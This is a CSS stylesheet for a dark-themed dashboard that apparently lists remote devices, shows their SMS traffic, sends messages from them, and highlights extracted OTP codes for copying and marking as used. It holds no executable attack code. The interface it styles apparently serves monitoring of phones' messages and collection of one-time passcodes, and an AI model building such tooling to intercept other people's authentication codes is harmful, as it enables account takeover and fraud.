    min-height: 0;
    display: flex;
    flex-direction: column;
  }

  .no-sel {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    color: #475569;
    font-size: 14px;
    min-height: 220px;
  }

  /* OVERVIEW */
  .live-card {
    display: flex;
    align-items: center;
    gap: 14px;
    background: #141b2d;
    border: 1px solid rgba(249, 115, 22, 0.2);
    border-top: 3px solid #f97316;
    border-radius: 10px;
    padding: 14px 18px;
    flex-shrink: 0;
  }
  .lc-icon {
    width: 52px;
    height: 52px;
    background: rgba(249, 115, 22, 0.08);
    border: 1px solid rgba(249, 115, 22, 0.2);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .lc-title {
    font-size: 17px;
    font-weight: 700;
    color: #f97316;
  }
  .lc-sub {
    font-size: 12px;
    color: #94a3b8;
    margin-top: 3px;
  }
  .stat-row {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
    flex-shrink: 0;
  }
  .stat-card {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-top: 3px solid;
    border-radius: 10px;
    padding: 16px 18px;
  }
  .sc-n {
    font-size: 38px;
    font-weight: 800;
    font-family: "JetBrains Mono", monospace;
    line-height: 1;
    letter-spacing: -0.04em;
    color: #38bdf8;
  }
  .sc-l {
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #64748b;
    margin-top: 4px;
  }
  .dt-card {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 10px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    flex: 1;
    min-height: 0;
  }
  .dt-filters {
    flex-shrink: 0;
  }
  .dt-scroll {
    flex: 1;
    min-height: 0;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.22) transparent;
  }
  .dt-scroll::-webkit-scrollbar {
    width: 6px;
  }
  .dt-scroll::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.22);
    border-radius: 99px;
  }

  .dt-scroll {
    overflow-y: auto;
    overflow-x: hidden;
    max-height: 540px;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    scrollbar-width: thin;
    scrollbar-color: rgba(255,255,255,0.12) transparent;
  }
  .dt-scroll::-webkit-scrollbar { width: 5px; }
  .dt-scroll::-webkit-scrollbar-track { background: transparent; }
  .dt-scroll::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.12); border-radius: 4px; }
  .dt-scroll::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.22); }
  .dt-table { width:100%; border-collapse:collapse; font-size:12.5px; }
      .dt-row { cursor:pointer; transition:background 80ms; border-bottom:1px solid rgba(255,255,255,0.03); }
  .dt-row:last-child { border-bottom:none; }
  .dt-row:hover { background:rgba(255,255,255,0.03); }
  .dt-row.dt-sel { background:rgba(249,115,22,0.07); }
    .td-st { display:flex; align-items:center; gap:7px; }
  .td-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
  .ton { background:#22c55e; box-shadow:0 0 5px rgba(34,197,94,.5); }
  .toff { background:#2d3748; }
  .tunk { background:#1a2236; border:1px solid #253048; }
  .son { color:#22c55e; font-weight:600; }
  .soff { color:#64748b; font-weight:600; }
  .sunk { color:#334155; font-weight:600; }
  .td-key { font-size:11.5px; color:#e2e8f0; }
  .td-num { font-size:12px; color:#94a3b8; }
  .td-del { background:none; border:none; color:#475569; font-size:16px; cursor:pointer; width:22px; height:22px; border-radius:4px; display:flex; align-items:center; justify-content:center; transition:all 120ms; padding:0; font-family:inherit; line-height:1; }
  .td-del:hover { color:#ef4444; background:rgba(239,68,68,0.12); }
  .dt-used { opacity:0.45; }
    .td-fb-dot { display:inline-block; width:6px; height:6px; border-radius:50%; flex-shrink:0; }
  .td-new { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.07em; padding:1px 5px; border-radius:4px; background:rgba(251,191,36,0.15); color:#fbbf24; border:1px solid rgba(251,191,36,0.3); flex-shrink:0; }

  /* ── Dashboard filter bar ──────────────────────────────────────────────── */
  .dt-filters { padding:10px 12px 6px; border-bottom:1px solid rgba(255,255,255,0.06); display:flex; flex-direction:column; gap:7px; }
  .dt-chips { display:flex; gap:5px; flex-wrap:wrap; }
  .dt-chip {
    display:flex; align-items:center; gap:4px;
    padding:4px 10px; border-radius:20px;
    border:1px solid rgba(255,255,255,0.1);
    background:rgba(255,255,255,0.04);
    color:#64748b; font-size:11px; font-weight:600;
    cursor:pointer; font-family:inherit;
    transition:all 140ms; white-space:nowrap;
  }
  .dt-chip:hover { color:#94a3b8; border-color:rgba(255,255,255,0.2); }
  .dt-chip-cnt { font-size:10px; font-weight:700; font-family:'JetBrains Mono',monospace; }
  /* Active chip states */
  .dca { background:#f97316!important; color:#fff!important; border-color:#f97316!important; }
  .dco { background:rgba(34,197,94,.18)!important; color:#22c55e!important; border-color:rgba(34,197,94,.4)!important; }
  .dcx { background:rgba(239,68,68,.14)!important; color:#ef4444!important; border-color:rgba(239,68,68,.3)!important; }
  .dcn { background:rgba(56,189,248,.15)!important; color:#38bdf8!important; border-color:rgba(56,189,248,.35)!important; }
  .dcu { background:rgba(167,139,250,.15)!important; color:#a78bfa!important; border-color:rgba(167,139,250,.35)!important; }
  .dcnew { border-color:rgba(251,191,36,.3)!important; color:#fbbf24!important; }
  .dcnew-a { background:rgba(251,191,36,.18)!important; }
  .dt-chip-clear {
    display:flex; align-items:center; gap:3px;
    padding:3px 9px; border-radius:20px;
    border:1px solid rgba(239,68,68,0.35);
    background:rgba(239,68,68,0.1); color:#ef4444;
    font-size:11px; font-weight:600; cursor:pointer; font-family:inherit;
    transition:all 140ms; white-space:nowrap;
  }
  .dt-chip-clear:hover { background:rgba(239,68,68,0.2); }

  /* Firebase badge row */
  .dt-fb-row { display:flex; align-items:center; gap:8px; flex-wrap:nowrap; overflow-x:auto; scrollbar-width:none; padding-bottom:2px; }
  .dt-fb-row::-webkit-scrollbar { display:none; }
  .dt-fb-lbl { font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#334155; flex-shrink:0; }
  .dt-fb-badges { display:flex; gap:5px; flex-wrap:nowrap; }
  .conn-badge {
    display:inline-flex; align-items:center; gap:4px;
    font-size:9.5px; font-weight:700; padding:3px 8px;
    border-radius:5px; border:1px solid;
    cursor:pointer; font-family:inherit;
    transition:all 140ms; white-space:nowrap; flex-shrink:0;
    background:transparent;
  }
  .conn-badge:hover { filter:brightness(1.2); }
  .cb-active { box-shadow:0 0 0 1px currentColor; }
  .cb-dot { width:5px; height:5px; border-radius:50%; flex-shrink:0; }
  .cb-n { font-family:'JetBrains Mono',monospace; font-size:9px; font-weight:700; opacity:0.8; }

  /* Filtered result count */
  .dt-count { padding:5px 14px; font-size:10.5px; color:#475569; font-weight:600; border-bottom:1px solid rgba(255,255,255,0.04); }

  /* DEVICE */
  .dv-card { display:flex; align-items:center; gap:14px; background:#141b2d; border:1px solid rgba(255,255,255,0.08); border-top:3px solid #f97316; border-radius:10px; padding:16px 20px; }
  .dv-left { display:flex; align-items:center; gap:12px; flex:1; min-width:0; }
  .dv-ico { width:48px; height:48px; border-radius:10px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); display:flex; align-items:center; justify-content:center; flex-shrink:0; }
  .dv-id { font-size:20px; font-weight:700; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; }
  .ob { font-size:10px; font-weight:700; padding:3px 10px; border-radius:20px; text-transform:uppercase; letter-spacing:0.05em; }
  .ob-on  { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .ob-off { background:rgba(100,116,139,0.1); color:#64748b; border:1px solid rgba(100,116,139,0.2); }
  .ob-unk { background:rgba(100,116,139,0.07); color:#334155; border:1px solid rgba(100,116,139,0.12); }
  .dv-bat { display:flex; flex-direction:column; align-items:flex-end; gap:2px; flex-shrink:0; }
  .dv-bat-n { font-size:44px; font-weight:800; font-family:'JetBrains Mono',monospace; line-height:1; letter-spacing:-0.04em; }
  .dv-bat-l { font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; }
  .bat-track { width:80px; height:4px; background:rgba(255,255,255,0.09); border-radius:2px; overflow:hidden; margin-top:4px; }
  .bat-fill { height:100%; border-radius:2px; transition:width 600ms; }
  .info-grid { display:grid; grid-template-columns:repeat(4,1fr); background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; }
  .ib { display:flex; flex-direction:column; gap:4px; padding:12px 14px; border-right:1px solid rgba(255,255,255,0.07); }
  .ib:last-child { border-right:none; }
  .ib-l { font-size:9.5px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:#64748b; }
  .ib-v { font-size:13.5px; font-weight:600; color:#e2e8f0; }
  .act-row { display:flex; gap:10px; }
  .dev-used-row { display:flex; align-items:center; background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:8px; padding:10px 14px; }
  .dev-used-label { display:flex; align-items:center; gap:8px; cursor:pointer; font-size:13px; font-weight:600; color:#94a3b8; user-select:none; }
  .dev-used-label:has(input:checked) { color:#22c55e; }
  .dev-used-label input { accent-color:#f97316; width:15px; height:15px; cursor:pointer; }
  .act-btn { flex:1; display:flex; align-items:center; justify-content:center; gap:8px; padding:14px; border-radius:9px; font-size:15px; font-weight:700; cursor:pointer; border:none; font-family:inherit; transition:all 160ms; }
  .ab-msg { background:#4f46e5; color:#fff; box-shadow:0 4px 18px rgba(79,70,229,0.4); }
  .ab-msg:hover { background:#4338ca; transform:translateY(-1px); }
  .ab-snd { background:#16a34a; color:#fff; box-shadow:0 4px 18px rgba(22,163,74,0.4); }
  .ab-snd:hover:not(:disabled) { background:#15803d; transform:translateY(-1px); }
  .ab-snd:disabled { opacity:.4; cursor:not-allowed; transform:none; }
  .afc { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; }
  .afc-hdr { padding:8px 12px; font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; border-bottom:1px solid rgba(255,255,255,0.07); }
  .afc-body { max-height:320px; overflow-y:auto; }
  .af-row { display:flex; align-items:center; gap:8px; padding:6px 12px; border-bottom:1px solid rgba(255,255,255,0.03); }
  .af-row:hover { background:rgba(255,255,255,0.03); }
  .af-k { font-size:11px; color:#64748b; min-width:100px; max-width:120px; flex-shrink:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .af-v { font-size:12px; color:#e2e8f0; flex:1; word-break:break-all; }
  .af-cp { background:none; border:none; color:#475569; cursor:pointer; padding:3px; border-radius:3px; transition:all 120ms; font-family:inherit; flex-shrink:0; }
  .af-cp:hover { color:#94a3b8; }
  .bool-b { padding:1px 7px; border-radius:4px; font-size:10.5px; font-weight:700; font-family:'JetBrains Mono',monospace; }
  .bt { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .bf { background:rgba(239,68,68,0.12); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }

  /* MESSAGES */
  .msg-topbar { display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
  .msg-count { font-size:17px; font-weight:700; color:#e2e8f0; white-space:nowrap; }
  .msg-search-wrap { flex:1; display:flex; align-items:center; gap:6px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.09); border-radius:7px; padding:7px 10px; min-width:180px; }
  .msg-search { background:none; border:none; outline:none; font-size:13px; color:#e2e8f0; width:100%; font-family:inherit; }
  .msg-search::placeholder { color:#475569; }
  .msg-tabs { display:flex; gap:4px; flex-shrink:0; }
  .mtab { padding:6px 14px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.04); color:#64748b; font-size:12px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 120ms; }
  .mta { background:#f97316!important; color:#fff!important; border-color:#f97316!important; }
  .mti { background:rgba(56,189,248,0.15)!important; color:#38bdf8!important; border-color:rgba(56,189,248,0.35)!important; }
  .mto { background:rgba(249,115,22,0.15)!important; color:#f97316!important; border-color:rgba(249,115,22,0.35)!important; }
  .msg-list { display:flex; flex-direction:column; gap:8px; }
  .msg-card { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:9px; padding:10px 12px; display:flex; flex-direction:column; gap:5px; transition:background 80ms; }
  .msg-card:hover { background:#172035; }
  .mc-row { display:flex; align-items:center; gap:10px; }
  .mc-sender { font-size:13px; font-weight:700; color:#e2e8f0; }
  .mc-badge { font-size:10px; font-weight:700; padding:2px 8px; border-radius:10px; text-transform:uppercase; letter-spacing:0.05em; }
  .badge-in  { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .badge-out { background:rgba(249,115,22,0.15); color:#f97316; border:1px solid rgba(249,115,22,0.3); }
  .mc-body { font-size:12.5px; color:#cbd5e1; line-height:1.5; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
  .mc-foot { display:flex; align-items:center; gap:8px; }
  .mc-dt { font-size:10.5px; color:#475569; font-family:'JetBrains Mono',monospace; }

  /* SEND */
  .send-wrap { max-width:560px; }
  .send-hdr { font-size:22px; font-weight:800; }
  .send-sub { font-size:12px; color:#64748b; margin-top:4px; }
  .send-form { display:flex; flex-direction:column; gap:14px; margin-top:16px; }
  .field { display:flex; flex-direction:column; gap:6px; }
  .field label { font-size:12px; font-weight:600; color:#94a3b8; }

  /* SHARED */
  input, textarea { background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:7px; padding:8px 10px; color:#e2e8f0; font-size:13px; font-family:inherit; outline:none; width:100%; transition:border-color 130ms; }
  input:focus, textarea:focus { border-color:rgba(249,115,22,0.5); }
  textarea { resize:vertical; }
  .code { font-family:'JetBrains Mono',monospace; font-size:12px; }
  .json-view { font-family:'JetBrains Mono',monospace; font-size:11px; color:#94a3b8; white-space:pre-wrap; word-break:break-all; max-height:200px; overflow-y:auto; background:rgba(0,0,0,0.3); border-radius:6px; padding:8px; margin:0; }
  .mono { font-family:'JetBrains Mono',monospace; }
  .btn { padding:8px 16px; border-radius:7px; font-size:13px; font-weight:600; cursor:pointer; border:none; font-family:inherit; transition:all 140ms; }
  .btn-primary { background:#f97316; color:#fff; box-shadow:0 3px 12px rgba(249,115,22,0.3); }
  .btn-primary:hover:not(:disabled) { background:#ea6c0a; }
  .btn-ghost { background:rgba(255,255,255,0.06); color:#94a3b8; border:1px solid rgba(255,255,255,0.1); }
  .btn-ghost:hover { background:rgba(255,255,255,0.1); color:#e2e8f0; }
  .btn-sm { padding:5px 12px; font-size:12px; }

  .spin-ring { display:inline-block; width:20px; height:20px; border:3px solid rgba(255,255,255,.2); border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; }

  /* TOASTS */
  .toast-stack { position:fixed; bottom:22px; right:22px; z-index:999; display:flex; flex-direction:column; gap:8px; pointer-events:none; }
  .toast { background:#1a2232; border:1px solid rgba(249,115,22,0.3); border-radius:8px; padding:10px 14px; font-size:13px; color:#e2e8f0; box-shadow:0 8px 32px rgba(0,0,0,0.7); animation:toast-in .2s ease both; min-width:180px; max-width:300px; }
  .toast.out { animation:toast-out .3s ease forwards; }
  .toast.success { border-color:rgba(34,197,94,0.4); color:#22c55e; }
  .toast.error   { border-color:rgba(239,68,68,0.4); color:#ef4444; }
  .toast.info    { border-color:rgba(56,189,248,0.3); color:#38bdf8; }

  @keyframes spin { to { transform:rotate(360deg); } }
  @keyframes toast-in  { from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none} }
  @keyframes toast-out { from{opacity:1}to{opacity:0;transform:translateY(6px)} }

  /* ── MOBILE HAMBURGER BUTTON ─────────────────────────────────────────── */
  .mob-menu-btn {
    display: none;
    align-items: center; justify-content: center;
    width: 36px; height: 36px;
    border-radius: 8px; border: 1px solid rgba(255,255,255,0.12);
    background: rgba(255,255,255,0.06); color: #e2e8f0;
    cursor: pointer; flex-shrink: 0;
    transition: all 140ms;
  }
  .mob-menu-btn:hover { background: rgba(255,255,255,0.1); }

  /* ── MOBILE BACKDROP ─────────────────────────────────────────────────── */
  .mob-backdrop {
    display: none;
    position: fixed; inset: 0; z-index: 110;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(2px);
  }

  /* ── BREAKPOINTS ─────────────────────────────────────────────────────── */

  /* Tablet (≤ 900px): tighten grids */
  @media (max-width: 900px) {
    .stat-row { grid-template-columns: 1fr 1fr; }
    .info-grid { grid-template-columns: 1fr 1fr; }
    .ap-grid  { grid-template-columns: 1fr 1fr; }
    .dt-scroll { max-height: 320px; }
  }

  /* Mobile (≤ 680px): full responsive layout */
  @media (max-width: 680px) {

    /* Show hamburger, hide sidebar by default */
    .mob-menu-btn  { display: flex; }

    /* Backdrop: shown when rendered (controlled by Svelte {#if}) */
    .mob-backdrop  { display: block; }

    /* Sidebar becomes a fixed drawer */
    .sidebar {
      position: fixed; left: 0; top: 0; bottom: 0;
      z-index: 120;
      transform: translateX(-100%);
      transition: transform 260ms cubic-bezier(0.4, 0, 0.2, 1);
      width: 280px !important;
      box-shadow: 4px 0 30px rgba(0,0,0,0.6);
    }
    .sidebar.mob-open { transform: translateX(0); }

    /* Main takes full width */
    .main { width: 100%; }

    /* Topbar: compact */
    .topbar { padding: 0 12px; height: 48px; }
    .tb-l { gap: 6px; }
    .tb-r { gap: 5px; }

    /* Hide stat pills on small screens — space is precious */
    .tbstat { display: none; }

    /* Smaller icon buttons for topbar */
    .ico-btn { width: 36px; height: 36px; }

    /* Tab bar: scrollable */
    .tab-bar { overflow-x: auto; padding: 0 8px; gap: 0; scrollbar-width: none; }
    .tab-bar::-webkit-scrollbar { display: none; }
    .tab { padding: 10px 14px; font-size: 12px; white-space: nowrap; flex-shrink: 0; }

    /* Tab body: less padding */
    .tab-body { padding: 12px 14px 80px; gap: 10px; }

    /* Overview stat row: 2 col */
    .stat-row { grid-template-columns: 1fr 1fr; gap: 8px; }
    .sc-n { font-size: 28px; }
    .stat-card { padding: 12px 14px; }

    /* Live card: compact */
    .live-card { padding: 12px 14px; gap: 10px; }
    .lc-icon { width: 40px; height: 40px; }
    .lc-title { font-size: 15px; }

    /* Device table: horizontally scrollable */
    .dt-scroll { max-height: 300px; overflow-x: auto; -webkit-overflow-scrolling: touch; }
    .dt-table { min-width: 480px; }

    /* Info grid: 2 col */
    .info-grid { grid-template-columns: 1fr 1fr; }

    /* Device card: stack vertically on very small */
    .dv-card { flex-direction: column; align-items: flex-start; gap: 10px; padding: 14px; }
    .dv-bat { align-items: flex-start; }
    .dv-bat-n { font-size: 32px; }
    .dv-id { font-size: 16px; }

    /* Action buttons: full width, bigger touch target */
    .act-row { flex-direction: column; gap: 8px; }
    .act-btn { padding: 16px; font-size: 16px; }

    /* Add Firebase form: single column */
    .ap-grid { grid-template-columns: 1fr; }

    /* Raw drawer: full width */
    .raw-drawer { max-height: 55vh; }
    .rd-row { flex-wrap: wrap; gap: 6px; }
    .rd-path { min-width: 0; }

    /* Send form: full width */
    .send-wrap { max-width: 100%; }

    /* Messages topbar: wrap */
    .msg-topbar { gap: 7px; }
    .msg-search-wrap { min-width: 0; }
    .msg-count { font-size: 14px; }

    /* Message list: touch-friendly */
    .msg-card { padding: 12px 14px; }
    .mc-otp { padding: 8px 12px; }
    .otp-code { font-size: 24px; }

    /* Toasts: bottom-center, full width */
    .toast-stack {
      right: auto; left: 50%; bottom: 16px;
      transform: translateX(-50%);
      width: calc(100vw - 32px); max-width: 400px;
      align-items: stretch;
    }
    .toast { min-width: 0; max-width: 100%; text-align: center; }

    /* Notifications: bottom of screen, full width on mobile */
    .notif-stack {
      top: auto; right: 0; left: 0; bottom: 60px;
      width: 100%; padding: 0 10px;
      max-height: 50vh;
    }
    .notif-scroll {
      max-height: 44vh;
      scrollbar-width: none;
    }
    .notif {
      border-radius: 16px;
      padding: 8px 11px 8px;
    }
    .notif-clear-all { border-radius: 12px; padding: 10px 12px; font-size:11px; }
    /* OTP stays compact on mobile */
    .n-otp-code { font-size: 20px; }
    .n-otp-row { padding: 7px 11px; }
    /* Compact search on mobile */
    .side-search { margin: 6px 8px 3px; padding: 5px 8px; }
    .search-in { font-size: 11px; }
    /* Smaller filter buttons on mobile */
    .filt { font-size: 10px; padding: 4px 2px; }

    /* Touch-friendly min height for interactive items */
    .dev-item { min-height: 48px; }
    .btn, .btn-sm { min-height: 40px; }
    .filt { min-height: 36px; }
  }

  /* Very small (≤ 360px): extra tightening */
  @media (max-width: 360px) {
    .tab { padding: 9px 10px; font-size: 11px; }
    .stat-row { grid-template-columns: 1fr 1fr; gap: 6px; }
    .sc-n { font-size: 24px; }
    .info-grid { grid-template-columns: 1fr 1fr; }
    .n-otp-code { font-size: 24px; }
    .notif { border-radius: 14px; }
  }

  /* ── NOTIFICATION STACK (top-left) ───────────────────────────────────── */
  /* ── NOTIFICATION STACK — Apple glass ───────────────────────────────────── */
  /* ── NOTIFICATION STACK ─────────────────────────────────────────────────── */
  /* ══ NOTIFICATION STACK — Apple Liquid Glass ═════════════════════════════ */
  .notif-stack {
    position: fixed; top: 54px; right: 16px; z-index: 1000;
    display: flex; flex-direction: column; gap: 8px;
    pointer-events: none; width: 360px;
  }
  .notif-scroll {
    display: flex; flex-direction: column; gap: 8px;
    overflow-y: auto; overflow-x: hidden;
    max-height: calc(4 * 204px + 3 * 8px); /* 4 cards max */
    pointer-events: all;
    padding-right: 2px;
    scrollbar-width: thin;
    scrollbar-color: rgba(255,255,255,0.08) transparent;
    user-select: none;
  }
  .notif-scroll::-webkit-scrollbar { width: 3px; }
  .notif-scroll::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }

  /* ── Card: Apple Liquid Glass ─────────────────────────────────────────── */
  .notif {
    pointer-events: all;
    position: relative;
    overflow: hidden;

    /* Self-sizing — no fixed min-height */
    display: flex; flex-direction: column; gap: 6px;

    /* Transparent liquid glass */
    background:
      linear-gradient(
        135deg,
        rgba(255,255,255,0.10),
        rgba(255,255,255,0.03) 45%,
        rgba(80,130,255,0.05)
      ),
      rgba(11,14,23,0.25);

    -webkit-backdrop-filter: blur(40px) saturate(200%) brightness(1.08);
    backdrop-filter: blur(40px) saturate(200%) brightness(1.08);

    border: 1px solid rgba(255,255,255,0.10);
    border-top-color: rgba(255,255,255,0.18);
    border-radius: 20px;

    box-shadow:
      0 16px 48px rgba(0,0,0,0.22),
      0 3px 12px rgba(0,0,0,0.12),
      inset 0 1px 0 rgba(255,255,255,0.18),
      inset 0 -1px 0 rgba(255,255,255,0.05);

    padding: 10px 13px 9px;
    color: #f8fafc;
    animation: notif-in 0.34s cubic-bezier(0.34,1.4,0.64,1) both;
    transition: background 220ms ease, border-color 220ms ease,
                box-shadow 220ms ease, transform 220ms ease;
  }
  /* Reflective sheen layer */
  .notif::before {
    content: "";
    position: absolute; inset: 0;
    pointer-events: none;
    border-radius: inherit;
    z-index: 0;
    background: linear-gradient(
      115deg,
      rgba(255,255,255,0.09) 0%,
      rgba(255,255,255,0.025) 22%,
      transparent 48%,
      rgba(100,150,255,0.035) 100%
    );
    opacity: 0.8;
  }
  /* All card children above sheen */
  
  @media (hover: hover) {
    .notif:hover {
      border-color: rgba(255,255,255,0.24);
      box-shadow: 0 24px 70px rgba(0,0,0,0.42), inset 0 1px 0 rgba(255,255,255,0.16);
      transform: translateY(-1px);
    }
  }
  .notif.nleave { animation: notif-out 0.25s ease forwards; }

  /* Fallback: no backdrop-filter */
  @supports not ((backdrop-filter: blur(1px)) or (-webkit-backdrop-filter: blur(1px))) {
    .notif { background: rgba(15,20,38,0.82); }
  }
  .n-close {
    width:17px; height:17px; border-radius:50%; flex-shrink:0;
    border:1px solid rgba(255,255,255,0.14);
    background:rgba(255,255,255,0.07);
    color:rgba(255,255,255,0.4); cursor:pointer;
    font-size:12px; display:flex; align-items:center; justify-content:center;
    padding:0; line-height:1; font-family:inherit;
    transition: background 160ms, transform 160ms;
  }
  .n-close:hover { background:rgba(239,68,68,0.35); border-color:rgba(239,68,68,0.5); color:#fff; }
  .n-close:active { transform:scale(0.92); }
  /* Header row */
  .n-top  { display:flex; align-items:center; justify-content:space-between; gap:6px; flex-shrink:0; }
  .n-ids  { display:flex; align-items:center; gap:5px; min-width:0; overflow:hidden; }
  .n-conn { font-size:9px; font-weight:800; letter-spacing:0.07em; flex-shrink:0; }
  .n-dev  { font-size:9px; color:rgba(255,255,255,0.5); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:'JetBrains Mono',monospace; }
  .n-time { font-size:9px; color:rgba(255,255,255,0.45); font-family:'JetBrains Mono',monospace; flex-shrink:0; }

  /* Sender + about row */
  .n-sender-row { display:flex; align-items:center; gap:6px; flex-shrink:0; flex-wrap:wrap; }
  .n-sender { font-size:12.5px; font-weight:700; color:#fff; letter-spacing:-0.01em; }
  .n-about {
    font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em;
    padding:2px 6px; border-radius:5px;
    background:rgba(249,115,22,0.15); color:#f97316; border:1px solid rgba(249,115,22,0.3);
    flex-shrink:0;
  }

  /* Message — 1-line clamp */
  .n-msg {
    font-size:11px; color:rgba(255,255,255,0.72); line-height:1.4;
    display:-webkit-box; -webkit-line-clamp:1; -webkit-box-orient:vertical;
    overflow:hidden; flex-shrink:0;
  }

  /* OTP — compact green glass panel */
  .n-otp-row {
    position: relative; overflow: hidden; flex-shrink:0;
    display: flex; align-items:center; gap:8px;
    padding: 6px 11px;
    margin-top: 2px;

    background:
      linear-gradient(135deg, rgba(52,211,153,0.13), rgba(16,185,129,0.035)),
      rgba(6,78,59,0.42);
    -webkit-backdrop-filter: blur(18px) saturate(160%);
    backdrop-filter: blur(18px) saturate(160%);
    border: 1px solid rgba(52,211,153,0.38);
    border-radius: 12px;

    box-shadow: inset 0 1px 0 rgba(255,255,255,0.08);
    cursor: pointer; user-select:none;
    transition: border-color 180ms, box-shadow 180ms;
  }
  .n-otp-row:hover { border-color: rgba(52,211,153,0.6); box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 0 14px rgba(52,211,153,0.18); }
  .n-otp-row:active { transform:scale(0.98); }
  .n-otp-label { font-size:8px; font-weight:800; text-transform:uppercase; letter-spacing:0.12em; color:rgba(52,211,153,0.65); flex-shrink:0; }
  .n-otp-code  {
    font-family:'JetBrains Mono',monospace; font-size:16px; font-weight:900;
    color: #4ade80;
    text-shadow: 0 0 12px rgba(74,222,128,0.14);
    font-variant-numeric: tabular-nums;
    letter-spacing:0.12em; flex:1;
  }
  .n-otp-copy-ico { color:rgba(74,222,128,0.45); flex-shrink:0; transition:color 130ms; }
  
  /* Verification-only row (no OTP extracted) */
  .n-verif-row {
    display:flex; align-items:center; gap:6px; flex-shrink:0;
    padding:5px 10px; border-radius:10px; margin-top:2px;
    background:rgba(56,189,248,0.08); border:1px solid rgba(56,189,248,0.2);
  }
  .n-verif-label { font-size:8px; font-weight:800; text-transform:uppercase; letter-spacing:0.1em; color:#38bdf8; flex-shrink:0; }
  .n-verif-text  { font-size:10px; color:rgba(255,255,255,0.7); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

  /* Clear all */
  .notif-clear-all {
    pointer-events:all; width:100%; padding:10px 14px;
    border-radius:16px; border:1px solid rgba(255,255,255,0.1);
    background: rgba(15,20,38,0.8);
    backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px);
    color:rgba(255,255,255,0.38); font-size:11.5px; font-weight:600;
    cursor:pointer; font-family:inherit; transition:all 160ms;
    text-align:center; letter-spacing:0.03em;
  }
  .notif-clear-all:hover { background:rgba(239,68,68,0.2); border-color:rgba(239,68,68,0.4); color:#fca5a5; }
  .notif-clear-all:active { transform:scale(0.98); }

  /* ── OTP in messages ──────────────────────────────────────────────────── */
  .mc-otp { display:flex; align-items:center; gap:8px; margin:4px 0; background:rgba(34,197,94,0.07); border:1px solid rgba(34,197,94,0.2); border-radius:7px; padding:6px 10px; cursor:pointer; user-select:none; transition:all 140ms; }
  .mc-otp:hover { background:rgba(34,197,94,0.16); border-color:rgba(34,197,94,0.45); transform:scale(1.01); }
  .mc-otp:active { transform:scale(0.98); }
  .otp-copy-hint { margin-left:auto; color:rgba(34,197,94,0.5); opacity:0; transition:opacity 140ms; flex-shrink:0; display:flex; align-items:center; }
  .mc-otp:hover .otp-copy-hint { opacity:1; }
  .otp-label { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; flex-shrink:0; }
  .otp-code { font-family:'JetBrains Mono',monospace; font-size:15px; font-weight:900; color:#22c55e; letter-spacing:0.14em; flex:1; }
  .otp-copy-btn { padding:5px 12px; border-radius:6px; border:none; background:#22c55e; color:#fff; font-size:12px; font-weight:700; cursor:pointer; font-family:inherit; transition:all 130ms; flex-shrink:0; white-space:nowrap; }
  .otp-copy-btn:hover { background:#16a34a; transform:scale(1.03); }

  /* ── Used / checkbox ─────────────────────────────────────────────────── */
  .mc-check { width:14px; height:14px; accent-color:#f97316; cursor:pointer; flex-shrink:0; }
  .mc-used { opacity:0.55; }
  .mc-body-used { text-decoration:line-through; color:#475569!important; }
  .mc-used-tag { font-size:10px; font-weight:700; color:#22c55e; background:rgba(34,197,94,0.12); border:1px solid rgba(34,197,94,0.25); border-radius:4px; padding:1px 6px; margin-left:auto; }

  /* ── Phone edit ──────────────────────────────────────────────────────── */
  .phone-edit-row { display:flex; gap:5px; align-items:center; }
